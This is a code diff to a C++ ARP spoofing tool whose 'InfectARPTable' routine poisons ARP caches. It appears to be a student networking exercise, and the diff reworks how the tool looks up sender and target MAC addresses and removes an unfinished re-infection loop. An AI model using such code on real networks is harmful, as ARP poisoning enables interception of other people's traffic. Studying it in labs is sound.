@@ -1,6 +1,5 @@
-
+#pragma once
 #include "send_arp.h"
-
 
 
 /*
@@ -157,15 +156,17 @@ bool SendARP::InfectARPTable()
     SetMyAddr(interface);
 
     //--- get sender's MAC ---
-    
+    memset(&buf, 0, sizeof(buf));
     MakeARP(ARPOP_REQUEST, &buf, NULL, myMAC, senderIP, myIP);
-     
-    //get response
-    bool getResponse = false;
-    
     pcapManager->Send((uint8_t *)&buf, (int)LEN::PACKETLEN);
+ //   RequestSenderMAC();
+    ARPRequest(0);
 
-    GetSenderMAC();
+
+    memset(&buf, 0, sizeof(buf));
+    MakeARP(ARPOP_REQUEST, &buf, NULL, myMAC, targetIP, myIP);
+    pcapManager->Send((uint8_t *)&buf, (int)LEN::PACKETLEN);     
+    ARPRequest(1);
 
     //___ get sender's MAC ___
    
@@ -179,42 +180,13 @@ bool SendARP::InfectARPTable()
 
     printf("infect ARP table : sender [%s] target [%s]\n", print_senderIP, print_targetIP);
     
-    //pcap_sendpacket(handle, (const u_char *)&buf, (int)Len::PACKETLEN);
     pcapManager->Send((uint8_t *)&buf, (int)LEN::PACKETLEN);
-    //___ infect ARP Table ___
-    isBuilt =  true;
-    return true;
-
-}
-
-
-bool SendARP::MaintainInfection()
-{
-
-    struct timeval tv;
-    gettimeofday (&tv, NULL);
-    long oldTime= (tv.tv_sec * 1000);
-
-
-    if(!isBuilt)
-        return false;
     
+    //___ infect ARP Table __
+    isBuilt =  true;
 
-    //주기적으로 패킷 전송
-    while(true)   
-    {
-        gettimeofday (&tv, NULL);
-        long passedTime = (tv.tv_sec *1000 -oldTime) /1000;
-        
-        if(passedTime >5 || passedTime <0)
-        {
-         //    pcap_sendpacket(handle, (const u_char *)&buf, (int)Len::PACKETLEN);
-        }
-
-
-    }
-
-
+    
+    return true;
 
 }
 
@@ -223,44 +195,151 @@ void SendARP::SetSenderMAC(uint8_t * sMAC)
 {
     memcpy(senderMAC, sMAC, ETH_ALEN);
     gotSenderMAC = true;
-
+     printf("senderMAC----\n");
 }
 
 
-bool SendARP::GetSenderMAC()
+void SendARP::SetTargetMAC(uint8_t * tMAC)
 {
+    memcpy(targetMAC, tMAC, ETH_ALEN);
+    gotTargetMAC = true;
+    printf("targetMAC----\n");
+
+}
+
+bool SendARP::RequestSenderMAC()
+{
+
     //구독 신청
-    Subscriber * sub = new Subscriber(NULL, 
-                                     (uint8_t * )myMAC, 
-                                     senderIP,
-                                     0, 
-                                     NULL, 
-                                     NULL,
+    Subscriber * sub = new Subscriber(NULL, (uint8_t * )myMAC, 
+                                     0, 0, 
+                                     NULL, NULL,
+                                     senderIP, 0,
                                      (uint32_t)SUBTYPE::GETSENDERMAC, 
                                      (void *)this, 
-                                     ETHERTYPE_ARP);
+                                     ETHERTYPE_ARP,
+                                     (void *)&SendARP::SetSenderMAC
+                                     );
 
+    
+    unique_lock<mutex> subMutexLock(subMutex);
+    
     pcapManager->AddSubscriber(sub);
+    
+    subMutexLock.unlock();
 
     ARPPACKET * arpPacket = (ARPPACKET * )packet;
 
     while (!gotSenderMAC) 
     {
-        sleep(5);
+        this_thread::sleep_for(5s);
         pcapManager->Send((uint8_t *)&buf, (int)LEN::PACKETLEN);
     }
+    
+    subMutexLock.lock();
 
+    pcapManager->ReleaseSubcriber(sub);
+
+    subMutexLock.unlock();
+    
     return true;
 
 } //bool SendARP::GetSenderMAC(ARPPACKET * packet)
 
 
-int main(int argc, char * argv[])
-{
-   
-       PcapManager mng((uint8_t *)"eth0");
-    SendARP a( (uint8_t *)argv[1], (uint32_t)inet_addr(argv[2]), (uint32_t)inet_addr(argv[3]), &mng);
 
-    a.InfectARPTable();
- 
+bool SendARP::ARPRequest(uint32_t requestWho)
+{
+    if(requestWho == 0)
+    {
+        printf("subin---\n");
+            //구독 신청
+       //구독 신청
+        Subscriber * sub = new Subscriber(NULL, (uint8_t * )myMAC, 
+                                        0, 0, 
+                                        NULL, NULL,
+                                        senderIP, 0,
+                                        (uint32_t)SUBTYPE::GETSENDERMAC, 
+                                        (void *)this, 
+                                        ETHERTYPE_ARP,
+                                        (void *)&SendARP::SetSenderMAC
+                                        );
+
+        
+        unique_lock<mutex> subMutexLock(subMutex);
+        
+        pcapManager->AddSubscriber(sub);
+        
+        subMutexLock.unlock();
+
+        ARPPACKET * arpPacket = (ARPPACKET * )packet;
+
+        while (!gotSenderMAC) 
+        {
+            this_thread::sleep_for(5s);
+            pcapManager->Send((uint8_t *)&buf, (int)LEN::PACKETLEN);
+        }
+        
+        subMutexLock.lock();
+
+        pcapManager->ReleaseSubcriber(sub);
+
+        subMutexLock.unlock();
+        
+        return true;
+
+
+    }
+
+    else if(requestWho == 1)
+    {
+       //구독 신청
+        Subscriber * sub = new Subscriber(NULL, (uint8_t * )myMAC, 
+                                        0, 0, 
+                                        NULL, NULL,
+                                        targetIP, 0,
+                                        (uint32_t)SUBTYPE::GETSENDERMAC, 
+                                        (void *)this, 
+                                        ETHERTYPE_ARP,
+                                        (void *)&SendARP::SetTargetMAC
+                                        );
+
+        
+        unique_lock<mutex> subMutexLock(subMutex);
+        
+        pcapManager->AddSubscriber(sub);
+        
+        subMutexLock.unlock();
+
+        ARPPACKET * arpPacket = (ARPPACKET * )packet;
+
+        while (!gotTargetMAC) 
+        {
+            this_thread::sleep_for(5s);
+            pcapManager->Send((uint8_t *)&buf, (int)LEN::PACKETLEN);
+        }
+        
+        subMutexLock.lock();
+
+        pcapManager->ReleaseSubcriber(sub);
+
+        subMutexLock.unlock();
+        
+        return true;
+
+
+    }
+
+
+
 }
+
+
+
+
+
+
+
+
+
+
